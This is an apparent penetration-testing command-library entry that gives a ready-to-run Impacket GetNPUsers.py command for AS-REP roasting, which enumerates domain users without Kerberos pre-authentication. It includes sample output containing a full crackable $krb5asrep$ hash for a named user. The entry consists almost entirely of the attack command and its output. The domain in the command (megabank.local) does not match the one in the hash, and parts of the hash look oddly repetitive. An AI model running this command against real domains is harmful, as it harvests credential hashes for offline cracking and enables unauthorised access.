---
id: 23c39a33-147b-4f0e-8776-9592377ed8b2
name: GetNPUsers.py Brute force Users with "Do Not Require Preauth."
type: command
executor: bash
data: GetNPUsers.py $_DOMAIN/ -no-pass -usersfile $_USERS.txt -dc-ip $_TARGET_IP
output: 'root@kali:~# GetNPUsers.py megabank.local/ -no-pass -usersfile names.txt
  -dc-ip 10.10.10.10

  Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

  [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos
  database)

  [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos
  database)

  $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:6a37d344a409c478aee2e0d048acf050$9b910dfba088b95def029d843ab30ea2460a6818f8841b14cda0115c987b511838ff22bdff323dc3e0236ce2022b258ca1302a9c7c5f60f1fff29504330df3cb4f9c9b6bdfb217f6240ff869fc6c6e08d3576a18e03b9fa3b8623fa9e8928478efd717a7923bd80bbd389d8eaff9a349f71f542becfc74780f803ed2bc679dc1f0e64ad3099f06ffea517ccc9db2f6a14c995cab9a781d49d396f4948c720b6f7e3a386b1ae8c67236deb23b6078e59d97916c7f23600183e8c353454352352435243543adefae2796567af0eaa71dd5543f41d0ffb2971bf4ebbdcb12046e45bfa32abf1b81bacdd0ce321e331e34524eaf7ad34fced19a5185ba02d54e5dad'
created_at: '2020-03-17T21:43:18.727800+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# GetNPUsers.py Brute force Users with "Do Not Require Preauth."

```bash
GetNPUsers.py $_DOMAIN/ -no-pass -usersfile $_USERS.txt -dc-ip $_TARGET_IP
```

## Expected Output

```
root@kali:~# GetNPUsers.py megabank.local/ -no-pass -usersfile names.txt -dc-ip 10.10.10.10
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:6a37d344a409c478aee2e0d048acf050$9b910dfba088b95def029d843ab30ea2460a6818f8841b14cda0115c987b511838ff22bdff323dc3e0236ce2022b258ca1302a9c7c5f60f1fff29504330df3cb4f9c9b6bdfb217f6240ff869fc6c6e08d3576a18e03b9fa3b8623fa9e8928478efd717a7923bd80bbd389d8eaff9a349f71f542becfc74780f803ed2bc679dc1f0e64ad3099f06ffea517ccc9db2f6a14c995cab9a781d49d396f4948c720b6f7e3a386b1ae8c67236deb23b6078e59d97916c7f23600183e8c353454352352435243543adefae2796567af0eaa71dd5543f41d0ffb2971bf4ebbdcb12046e45bfa32abf1b81bacdd0ce321e331e34524eaf7ad34fced19a5185ba02d54e5dad
```
